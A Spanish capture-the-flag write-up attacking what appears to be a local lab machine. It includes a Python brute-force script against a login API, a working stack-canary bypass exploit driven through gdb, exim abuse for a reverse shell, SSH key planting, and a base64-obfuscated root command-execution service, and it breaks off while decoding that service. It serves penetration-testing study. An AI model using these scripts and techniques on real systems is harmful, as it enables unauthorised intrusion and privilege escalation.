## Enumeracion de Puertos, Servicios y Versiones

```bash
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

![image](https://github.com/user-attachments/assets/1f313174-c9b0-4962-8a18-358873b3e4d1)

observams los puertos 22 y 80 levantados y vemos que el servicio web redirecciona al dominio `http://cybersec.dl` asi que lo agregamos al archivo `/etc/hosts`

```bash
echo '172.17.0.2 cybersec.dl' >> /etc/hosts
```

ahora chequeamos la web

![image](https://github.com/user-attachments/assets/93951116-7cf1-48f8-a2c5-7008f0f2d60e)

resulta ser la web de una empresa de Ciberseguidad, inspecciono el codigo funete pero no observo nada, sin embago si inspeccionamos un poco mas veremos que hace uso de
una `api`

![image](https://github.com/user-attachments/assets/f3447ba9-5b85-4ed7-9cff-94693a375776)

Parece ser que es un `api` que se encarga de generar las password que se muestran en la web, asi que tenemos por donde tirar y ver si conseguimos algo mas `http://cybersec.dl/api/...`
por lo que hace fuzzing en este punto a ver si consigo algo mas

```bash
feroxbuster -u http://cybersec.dl/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 5
```

![image](https://github.com/user-attachments/assets/81cf5a72-a9db-40c3-9cfc-429bf6826ed7)

sin mucho problema localizamos un punto final, asi que testeamos

![image](https://github.com/user-attachments/assets/fb52d54c-df14-49c1-b841-322b89e77a1d)

vemos que nos dice metodo no permitido y es porque se envia una solicitud `GET` y espera una `POST`, para intentar autenticarme lo que hare sera un script en python
que relice un ataque de diccionario contra la `api` a ver si consigo algo

```python
import requests
import json

# URL de la API
url = 'http://cybersec.dl/api/login'

# Función para leer una wordlist desde un archivo
def leer_wordlist(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        return [line.strip() for line in file]

# Función para realizar el ataque de fuerza bruta
def brute_force_attack(usernames, passwords):
    headers = {
        'Content-Type': 'application/json'
    }
    for username in usernames:
        for password in passwords:
            data = {
                'username': username,
                'password': password
            }
            response = requests.post(url, headers=headers, data=json.dumps(data))

            # Verificar si la respuesta indica un inicio de sesión exitoso
            if 'success' in response.text:
                print(f'[+] ¡Credenciales encontradas! Usuario: {username}, Contraseña: {password}')
                return
            else:
                print(f'[-] Fallido: Usuario: {username}, Contraseña: {password}')

    print('[-] No se encontraron credenciales válidas.')

# Especificar las rutas de las wordlists
usernames_file = 'usernames.txt'
passwords_file = '/usr/share/wordlists/rockyou.txt'

# Leer las wordlists
usernames = leer_wordlist(usernames_file)
passwords = leer_wordlist(passwords_file)

# Ejecutar el ataque de fuerza bruta
brute_force_attack(usernames, passwords)
```
creo la wordlist de usuarios comunes tales como `admin`, `administator`, `administrador`... y ejecuto el script


```bash
python3 brute-force-api.py
```

![image](https://github.com/user-attachments/assets/5bacda20-73fc-43f7-ae90-c1de8786d5db)

estaba muy debil las credenciales ya que se localizan con mucha rapidez, capturo una peticion con burpsuite

![image](https://github.com/user-attachments/assets/1dd920df-b231-4262-9af9-8a518fb08c9a)

la modifico para enviar las crdenciales obtenidas y observamos la informacion que devuelve

![image](https://github.com/user-attachments/assets/0457875f-89de-46bd-9cdf-7e511bf02987)

de la informacion extraida, lo mas interesante para nosotros es la `url` que se expone `http://cybersec.dl/555555555555509.txt` asi que accedemos al archivo txt

![image](https://github.com/user-attachments/assets/561156f7-b486-4379-b73e-4e5e715ae049)

aqui ya podriamos tener 2 posibles usuarios, lo otro que resulta de interes es la referencia donde carga el binario > `bin` <, `bin` podria ser el directorio `/bin` en 
linux asi como un posible directorio o subdirectorio, pero al testear no resulta ser un directorio asi que testeo agregando el subdominio `bin.cybersec.dl` al archivo
`/etc/hosts` y logro acceder a un panel de descarga con lo que parece ser el binario del texto

![image](https://github.com/user-attachments/assets/3c6db733-c0d8-4765-9fb6-a2fb9211259e)

si descargo el binario y comienzo analizarlo, en principio no parece ser muy util

![image](https://github.com/user-attachments/assets/1307bdf2-863e-4dea-84c8-ef512cd78a0d)

testeo si alguna entrada es vulnerable a un bof

![image](https://github.com/user-attachments/assets/93949671-dda7-41ee-858f-322a80436b18)

resulta ser vulnerable a un bof y por el mensaje de error ya podemos deducir que tiene la proteccion `canary` activa, asi que chequeamos las protecciones

```bash
checksec --file=smashing 
```

![image](https://github.com/user-attachments/assets/355734ac-c09d-4d1a-8e53-96c5839e6665)

se observan todas las protecciones del binario activas, parece ser que tendra su complejidad, primero chequeo si tiene presente la vulnerabilidad `format string` a ver
si podria likear direcciones de memoria

![image](https://github.com/user-attachments/assets/8977d013-7ede-4e91-8a60-1bf78e1d18fd)

no esta presente, aunque si estuviera presente igual no serviria de nada debido a que la primera entrada es la vulnerable al bof por lo que en la sigueinte entrada no
podriamos tomar control del binario por no ser vulnerable en ese punto asi que toca por otra via intentar explotar dicho binario pero primero un poco de ingenieria inversa
para observar como se compone internamente

![image](https://github.com/user-attachments/assets/076325ef-1c04-4d65-963b-06a6b55912d2)

a primera vista se observa que contiene muchas funciones que al parecer nunca se llaman en el flujo normal del programa por lo que esto debe tratarse de codigo basura, asi
que tocara ir analizando funcion por funcion para determinar cual o cuales podrian ser de interes para la explotacion...

![image](https://github.com/user-attachments/assets/100777e6-0d8e-4465-a00d-64ef935d69e8)

despues de un rato analizando el binario no se ve por ahora nda de interes, la funcion intel aunque cuenta con la ejecucion de una shell, no funciona para nada ya que el
binario no tiene conexion remota como para poder obtener acceso mediante esta funcion, aparde de ejecutar el comando `chmod` que deja vulnerable mi sistema si llegara a
ejecutarse... por lo que continuamos analizando el binario y observo que la funcion que se llama en la ejecucion normal del binario es `factor2()`

![image](https://github.com/user-attachments/assets/dee060c5-462f-46bf-be38-bb490dcfdb30)

por otro lado observo la funcion `factor1()` que podria llegar a ser de interes ya que esta concatenando informacion e imprimiendo

![image](https://github.com/user-attachments/assets/3958ba2e-111c-466c-b325-3d5e922941b4)

incluso se puede observar un `printf` imprimiendo "info" + la informacion que podria ser de interes asi que nos sentraremos en esta funcion para intentar saltar a ella
e imprimir dicho mensaje... por lo que corremos el binario con el depurador `gdb` para un analisis mas profundo...

### Analisis con GDB

corremos el binario

```bash
gdb ./smashing -q
```

desensamblamos la funcion de interes `factor1()`

![image](https://github.com/user-attachments/assets/3d4a8df7-f12e-4687-8bf2-417a52c4d518)

aqui ya podemos ver donde se localiza el canary, esta en la direccion de memoria `rbp-0x8`

![image](https://github.com/user-attachments/assets/38538e46-551d-46cb-93d3-40be6317947c)

ya que sabemos donde se localiza en memoria el canary, testearemos la extraccion del canary, primero colocamos un breakpoint en la funcion principal `main()`, corremos
el binario para que se detenga en el breakpoint y continueamos analizando desensamblando la funcion `factor2` ya que es a donde salta desde `main()`

![image](https://github.com/user-attachments/assets/12e23eed-57f8-4588-a608-4e2c8d87b7dd)

aqui ya vemos las direcciones de memoria aleatorizadas por lo que podemos tomar una direccion despues de que se mueva el canary desde el registro `RAX` a `rbp-0x8`

![image](https://github.com/user-attachments/assets/72c0b1a6-9d5a-4467-a582-9940d962bf83)

coloco un nuevo breakpoint en la direccion `0x00005555555562f9`

![image](https://github.com/user-attachments/assets/1d46e000-aa78-4d87-b386-fb820d27c3e0)

vemos que despues de continuar la ejecucion del programa, se detiene en el segundo breakpoint que nos permitira obtener el canary

![image](https://github.com/user-attachments/assets/0ca82470-e33e-4e22-8dd0-709ed0d7e10c)

ahora calculamos el desplazamiento desde el `canary` hasta el `rip` y para esto colocamos un breakpoint despues de la instruccion `fgets`, continuenamos la ejecucion del programa y enviamos un payload disenado para localizar el desplazamiento

```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBDDDDDDDDEEEEEEEEFFFFFFFF

A's = Buffer
B's = Canary
```

![image](https://github.com/user-attachments/assets/6ef11596-5cee-4acd-8f35-b56d6bc6a743)

procedemos a inspeccionar la memoria despues de enviar el payload y que se detenga en el breakpoint

![image](https://github.com/user-attachments/assets/990e2013-482b-4551-ab8a-7a3ab3608c73)

aqui ya observamos donde se localiza el payload enviado anteriormente, lo que nos permite determinar el `rip`, asi que consultamos su valor

![image](https://github.com/user-attachments/assets/6efa442f-9009-4f68-bbf8-964383350c59)

el `rip` fue sobrescrito con las E's [0x4545454545454545], esto quiere decir que el desplazamiento desde el `canary` hasta el rip es de 8 bytes


```bash
AAAAAAAAAAAAA.... = primeros 72 bytes para rellenar el buffer y llegar al canary
BBBBBBBB = 8 bytes del canary
CCCCCCCC = 8 bytes de padding
EEEEEEEE = 8 bytes direccion de retorno rip
```
Ya conociendo la estructura de la pila, sabiendo donde se localiza el valor del canario, es hora de disenar un exploit que extraiga en tiempo de ejecucion las direcciones necesarias para tomar el control del binario....

Necesitamos extraer en tiempo de ejecucion las siguiente direcciones: 

Direccion de la funcion factor1(): Direccion de la funcion donde saltaremos y esta la localizamos asi:
primero se establece un breakpoint en la funcion `main()` y corremos el programa, esto con la intension de que se aleatoricen las direcciones de memoria y podamos extraer la direccion correcta para nuestro payload... Despues de que se detenga en `main()` ya con las direcciones aleatorizadas extraemos direccion con: `p factor1`, veremos algo asi:

![image](https://github.com/user-attachments/assets/10e63d28-5e3f-4f00-812d-0b2a4be79e06)

Ahora necesitamos crear un breakpoint despues de que el registro `RAX` mueve a la pila el `canary` y asi extraer su valor.

cuando se mueve el `canary` desde `RAX` hasta la pila
![image](https://github.com/user-attachments/assets/e23f1b31-37a6-4f5b-a2c8-e3c097fd6c44)

nuestra direccion objetivo es una direccion localizada despues de la que se resalta en la imagen anterior, es decir, podria ser 

![image](https://github.com/user-attachments/assets/8044433a-16db-4b9a-ab63-b5f7f86f25cb)

por lo que vamos a necesitar extraer la esa direccion en tiempo de ejecucion para crear el nuevo breakpoint y extraer el valor del canary con un `x/1gx $rbp-0x8`

ya sabiendo como debe estar estructurado el exploit, lo desarrollamos, pero aqui hay un punto de mucho interes, y es como vamos a extraer en tiempo de ejecucion las direcciones si no cuenta con una vulnerabilidad `format strings` el binario que nos permita likear direcciones de memorias, por lo que en este caso yo interactuare como el depurador `gdb` para extraer en timepo de ejecucion esta informacion... por lo que el exploit me queda asi:


exploit.py
```python
import pexpect
import re
import struct
from pwn import *

def atack():
    # 4 espacios de identacion
    binary = ELF("smashing")
    binary_path = "smashing"
    gdb_process = pexpect.spawn(f"gdb {binary_path}", timeout=10, maxread=10000, searchwindowsize=100)
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set disassembly-flavor intel")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set pagination off")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set style enabled off")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("break main")
    gdb_process.expect("(gdb)")
    #gdb_process.sendline("break factor1")
    #gdb_process.expect("(gdb)")
    gdb_process.sendline("run")

    # Extraccion direccion de funcion   factor1()
    gdb_process.expect("(gdb)")
    gdb_process.sendline("p factor1")
    gdb_process.expect_exact("(gdb)", timeout=10)
    address_factor1 = gdb_process.before.decode('utf-8')
    match = re.search(r'0x[0-9a-f]+', address_factor1)
    if match:
       address_factor1_str = match.group(0)  # Extraer la dirección en formato hexadecimal
       address_factor1_int = int(address_factor1_str, 16)
       address_factor1_le = p64(address_factor1_int) # direccion de factor1 en formato little-endian lista para el payload
       gdb_process.sendline(" ") # prepara gdb para recibir el siguiente comando!
    else:
       print("No se pudo extraer la dirección de factor1().")
       exit(1)

    # extraemos la direccion de memoria que nos permitira crear un breakpoint para capturar el canary ya cargado en el stack
    gdb_process.expect("(gdb)")
    gdb_process.sendline("disas factor2")
    gdb_process.expect_exact("(gdb)", timeout=10)
    address_factor2 = gdb_process.before.decode('utf-8')
    lines = address_factor2.splitlines()
    memory_addresses = [line.split()[0] for line in lines if '<+' in line]
    if len(memory_addresses) >= 7:
       seventh_memory_address = memory_addresses[6]
       gdb_process.sendline(" ")
       gdb_process.expect("(gdb)")
       gdb_process.sendline(f"break *{seventh_memory_address}")
       gdb_process.expect("(gdb)")
       gdb_process.sendline("continue")
    else:
       print("No hay suficientes direcciones de memoria en la salida")

    # calculamos el Canary
    gdb_process.expect("(gdb)")
    gdb_process.sendline("x/1gx $rbp-0x8")
    gdb_process.expect_exact("(gdb)", timeout=10)
    output_canary = gdb_process.before.decode('utf-8')
    canary_value = output_canary.split(':')[1].strip().split()[0]
    output_canary_int = int(canary_value, 16)
    output_canary_le = struct.pack('<Q', output_canary_int) # canary listo en formato little-endian para el payload
    gdb_process.sendline(" ")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("continue")

    # construccion del payload
    buffer_size = 72 # hasta el canary
    buffer_fil = b'S' *buffer_size
    padding = b'A' *8

    payload = flat(
    buffer_fil,
    output_canary_le,
    padding,
    address_factor1_le
    )
    # Enviar el payload
    gdb_process.expect("Introduce tu nombre: ")
    gdb_process.sendline(payload)
    gdb_process.interact()
    gdb_process.send(b"quit")
    gdb_process.close()

if __name__ == '__main__':
    atack()
```

el exploit tiene sus secciones comentadas de que accion realiza, no voy a detenerme a explicar cada detalle del exploit ya que solo interactua con el depurador y hago uso de expresiones regulares para la extraccion de las direcciones que necesito para terminar construyendo el payload y enviandolo al binario para saltar a la funcion `factor1()` y observar que informacion imprime.... asi que ya con el exploit desarrollado lo ejecutamos...


![image](https://github.com/user-attachments/assets/68d67ac3-7b63-4ef1-9739-04430dd7e63e)

al ejecutar el exploit, puede que no salga a la primera como se observa arriba que se detecto la sobrescritura del canary y aborto la ejecucion del programa y esto es normal ya que trabajamos con direcciones de memoria aleatorias que pueden generar caracteres que no sean correctamente interpretados al ser enviados por lo que fallara, solo es cuestion de volver a ejecutar el exploit

![image](https://github.com/user-attachments/assets/b50d505d-13e9-40d8-8fbc-bb5b41f33e6f)

como se observa en la segunda ejecucion del exploit a funcionado devolviendo un mensaje

![image](https://github.com/user-attachments/assets/3dadca96-dcaa-435a-ad98-192de1c46574)

despues de testear la cadena que imprime, descubro que esta en `base58` y al parecer almacenaba una password

![image](https://github.com/user-attachments/assets/c417107b-b332-4d7f-81bf-d759c5801ebe)

ahora testeamos la posible password `Chocolate.1704` contra los posibles usuarios que vimos en el txt y resulta que conseguimos acceso

![image](https://github.com/user-attachments/assets/fe54232e-e546-44a7-8dc1-dbd1bea2b83e)

## Escalada de Privilegios

### flipsy

![image](https://github.com/user-attachments/assets/cad1547b-f864-4332-845e-311e34cf62ee)

de entrada ya observamos que es posible ejecutar el binario `exim` como el usuarios `darksblack`, no es tan facil conseguir informacion de como llegar a explotar dicho binario pero con mucha lectura es posible, toca leer la documentacion del binario...

![image](https://github.com/user-attachments/assets/192a111d-5139-411c-a1c4-d3439331f1c5)

no me detendre a explicar mucho, pero si dejare el enlace a la documentacion para quien quiera leerla
`https://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html`

![image](https://github.com/user-attachments/assets/175a4f1a-b85a-4683-9b03-5a612a9bb97f)

aqui puedo observar que por alguna razon desconocida para mi, no puedo ejecutar una shell como `darksblack` sin embago si que puedo ejecutar otros comandos como dicho usuario, asi que enviamos una `revershell`

![image](https://github.com/user-attachments/assets/fb2401d5-b8d3-42b9-afa1-26d9f2eebd30)

pero de esta forma no es posible porque `sh` no soporta la redireccion a `/dev/tcp`, siendo `bash` la unica que si lo soporta, el problema es que no podemos obtener una `bash` porque no existe en el sistema, asi que lo que consegui fue una `revershell` con `netcat`

![image](https://github.com/user-attachments/assets/1d44a28d-da7b-4b78-a902-b6db09d8e7f5)

pero aqui surge otro problema, la `revershell` termina debido a que `exim` tiene un tiempo de espera para la respuesta de un comando ejecutado y de no recibir nada termina el proceso por lo que tambien terminan los procesos hijos (la revershell), aunque esto lo solucionamos con `setsid`, que nos permitira ejecutar la `revershell` en un proceso independiente que en caso de terminar el proceso `exim`, no terminaria la `revershell`

![image](https://github.com/user-attachments/assets/60561fab-cc24-49ad-8ff0-2e29e0027099)

en este punto ya no importa si termina o no termina el proceso de `exim`, pero surge un problema mas paraa mi, y es que no logro sanitizar la `tty` con una `sh` y lo mas facil que se me ocurrio fue crear llaves `ssh` y suplantar las existentes para tocar el control como `darksblack` a traves de `ssh`

Desde mi maquina atacante creo las llaves `ssh`

```bash
ssh-keygen -t rsa -b 4096

Generating public/private rsa key pair.
Enter file in which to save the key (/home/darks/.ssh/id_rsa): 
/home/darks/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase for "/home/darks/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/darks/.ssh/id_rsa
Your public key has been saved in /home/darks/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:SEJmjYxbjUzyP1j9Y7ulod928JQQAHaRhzS+Oug5Dj4 darks@Darks
The key's randomart image is:
+---[RSA 4096]----+
|  .===  oo*=     |
|  .** oo oo.o    |
|   oo o . .. .   |
|  .  * . . ..    |
|    . + S =  . . |
|       o o o. o  |
|    . . o o .+   |
|   .Eo.. o *. o  |
|    .o+...+...   |
+----[SHA256]-----+
```

ahora copio las llaves a mi directorio actual

```bash
cp /home/darks/.ssh/id_rsa . && cp /home/darks/.ssh/id_rsa.pub .
```

ahora a la llave `id_rsa.pub` le hacemos una copia y a dicha copia le cambiamos el nombre por `authorized_keys`

```bash
cp id_rsa.pub authorized_keys
```

debemos subir al servidor los archivos authorized_keys y id_rsa.pub en el directorio .ssh de `darksblack` y como en este caso dicho directorio no existia, simplemente lo cree

![image](https://github.com/user-attachments/assets/3aebc5ec-b672-42a3-9afa-84c31bfd095a)

desde mi maquina atacante me levanto un servidor con python para descargar las lleves en `.ssh`

![image](https://github.com/user-attachments/assets/8b902750-b9e0-4911-a4ef-646e1fe511fc)

ya cargada las lleves y validado que tengan los permisos adecuados, puedo acceder via `ssh` directamente como `darksblack`

![image](https://github.com/user-attachments/assets/87597703-db4a-46b9-8946-562fcc4cc0d2)

### darksblack

busque un rato en el sistema pero no conseguia nada, reviso los procesos y puedo observar un script de python siendo ejecutados por `root`, el script `/opt/cybersecurity_company/app.py` es el servicio web pero el script `serverpi.py` es un tanto mas raro

![image](https://github.com/user-attachments/assets/f4fdf096-6caa-4b95-9f02-8c2cc2df2a8a)

script `serverpi.py`

```python
import base64; p0o = "aW1wb3J0IGh0dHAuc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKaW1wb3J0IHVybGxpYi5wYXJzZQppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgYmFzZTY0CgpQT1JUID0gMjUwMDAKCkFVVEhfS0VZX0JBU0U2NCA9ICJNREF3TUdONVltVnljMlZqWDJkeWIzVndYM0owWHpBd01EQXdNQW89IgoKY2xhc3MgSGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgogICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICBhdXRoX2hlYWRlciA9IHNlbGYuaGVhZGVycy5nZXQoJ0F1dGhvcml6YXRpb24nKQoKICAgICAgICBpZiBhdXRoX2hlYWRlciBpcyBOb25lIG9yIG5vdCBhdXRoX2hlYWRlci5zdGFydHN3aXRoKCdCYXNpYycpOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAxKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiQXV0aG9yaXphdGlvbiBoZWFkZXIgaXMgbWlzc2luZyBvciBpbmNvcnJlY3QiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBFeHRyYWVyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUgKGVuIEJhc2U2NCkKICAgICAgICBlbmNvZGVkX2tleSA9IGF1dGhfaGVhZGVyLnNwbGl0KCdCYXNpYyAnKVsxXQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGFsbWFjZW5hZGEgZW4gQmFzZTY0CiAgICAgICAgZGVjb2RlZF9zdG9yZWRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShBVVRIX0tFWV9CQVNFNjQpLmRlY29kZSgpLnN0cmlwKCkgICMgRWxpbWluYXIgc2FsdG9zIGRlIGzDrW5lYQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUKICAgICAgICBkZWNvZGVkX2NsaWVudF9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGVuY29kZWRfa2V5KS5kZWNvZGUoKS5zdHJpcCgpICAjIEVsaW1pbmFyIHNhbHRvcyBkZSBsw61uZWEKCiAgICAgICAgIyBDb21wYXJhciBsYXMgY2xhdmVzCiAgICAgICAgaWYgZGVjb2RlZF9jbGllbnRfa2V5ICE9IGRlY29kZWRfc3RvcmVkX2tleToKICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDQwMykKICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIkludmFsaWQgYXV0aG9yaXphdGlvbiBrZXkiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBQcm9jZXNhciBlbCBwYXLDoW1ldHJvICdleGVjJwogICAgICAgIHBhcnNlZF9wYXRoID0gdXJsbGliLnBhcnNlLnVybHBhcnNlKHNlbGYucGF0aCkKICAgICAgICBxdWVyeV9wYXJhbXMgPSB1cmxsaWIucGFyc2UucGFyc2VfcXMocGFyc2VkX3BhdGgucXVlcnkpCgogICAgICAgIGlmICdleGVjJyBpbiBxdWVyeV9wYXJhbXM6CiAgICAgICAgICAgIGNvbW1hbmQgPSBxdWVyeV9wYXJhbXNbJ2V4ZWMnXVswXQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBhbGxvd2VkX2NvbW1hbmRzID0gWydscycsICd3aG9hbWknXQogICAgICAgICAgICAgICAgaWYgbm90IGFueShjb21tYW5kLnN0YXJ0c3dpdGgoY21kKSBmb3IgY21kIGluIGFsbG93ZWRfY29tbWFuZHMpOgogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSg0MDMpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYiJDb21tYW5kIG5vdCBhbGxvd2VkLiIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCgogICAgICAgICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoY29tbWFuZCwgc2hlbGw9VHJ1ZSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShyZXN1bHQpCiAgICAgICAgICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDUwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShlLm91dHB1dCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAwKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiTWlzc2luZyAnZXhlYycgcGFyYW1ldGVyIGluIFVSTCIpCgp3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIxMjcuMC4wLjEiLCBQT1JUKSwgSGFuZGxlcikgYXMgaHR0cGQ6CiAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkK"; p1tr = base64.b64decode(p0o.encode()).decode(); exec(p1tr)
```
solo parece estar codeado en base64, asi que si decodifico para ver el verdadero codigo por detras, se obtiene:

```bash
echo 'aW1wb3J0IGh0dHAuc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKaW1wb3J0IHVybGxpYi5wYXJzZQppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgYmFzZTY0CgpQT1JUID0gMjUwMDAKCkFVVEhfS0VZX0JBU0U2NCA9ICJNREF3TUdONVltVnljMlZqWDJkeWIzVndYM0owWHpBd01EQXdNQW89IgoKY2xhc3MgSGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgogICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICBhdXRoX2hlYWRlciA9IHNlbGYuaGVhZGVycy5nZXQoJ0F1dGhvcml6YXRpb24nKQoKICAgICAgICBpZiBhdXRoX2hlYWRlciBpcyBOb25lIG9yIG5vdCBhdXRoX2hlYWRlci5zdGFydHN3aXRoKCdCYXNpYycpOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAxKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiQXV0aG9yaXphdGlvbiBoZWFkZXIgaXMgbWlzc2luZyBvciBpbmNvcnJlY3QiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBFeHRyYWVyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUgKGVuIEJhc2U2NCkKICAgICAgICBlbmNvZGVkX2tleSA9IGF1dGhfaGVhZGVyLnNwbGl0KCdCYXNpYyAnKVsxXQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGFsbWFjZW5hZGEgZW4gQmFzZTY0CiAgICAgICAgZGVjb2RlZF9zdG9yZWRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShBVVRIX0tFWV9CQVNFNjQpLmRlY29kZSgpLnN0cmlwKCkgICMgRWxpbWluYXIgc2FsdG9zIGRlIGzDrW5lYQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUKICAgICAgICBkZWNvZGVkX2NsaWVudF9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGVuY29kZWRfa2V5KS5kZWNvZGUoKS5zdHJpcCgpICAjIEVsaW1pbmFyIHNhbHRvcyBkZSBsw61uZWEKCiAgICAgICAgIyBDb21wYXJhciBsYXMgY2xhdmVzCiAgICAgICAgaWYgZGVjb2RlZF9jbGllbnRfa2V5ICE9IGRlY29kZWRfc3RvcmVkX2tleToKICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDQwMykKICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIkludmFsaWQgYXV0aG9yaXphdGlvbiBrZXkiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBQcm9jZXNhciBlbCBwYXLDoW1ldHJvICdleGVjJwogICAgICAgIHBhcnNlZF9wYXRoID0gdXJsbGliLnBhcnNlLnVybHBhcnNlKHNlbGYucGF0aCkKICAgICAgICBxdWVyeV9wYXJhbXMgPSB1cmxsaWIucGFyc2UucGFyc2VfcXMocGFyc2VkX3BhdGgucXVlcnkpCgogICAgICAgIGlmICdleGVjJyBpbiBxdWVyeV9wYXJhbXM6CiAgICAgICAgICAgIGNvbW1hbmQgPSBxdWVyeV9wYXJhbXNbJ2V4ZWMnXVswXQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBhbGxvd2VkX2NvbW1hbmRzID0gWydscycsICd3aG9hbWknXQogICAgICAgICAgICAgICAgaWYgbm90IGFueShjb21tYW5kLnN0YXJ0c3dpdGgoY21kKSBmb3IgY21kIGluIGFsbG93ZWRfY29tbWFuZHMpOgogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSg0MDMpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYiJDb21tYW5kIG5vdCBhbGxvd2VkLiIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCgogICAgICAg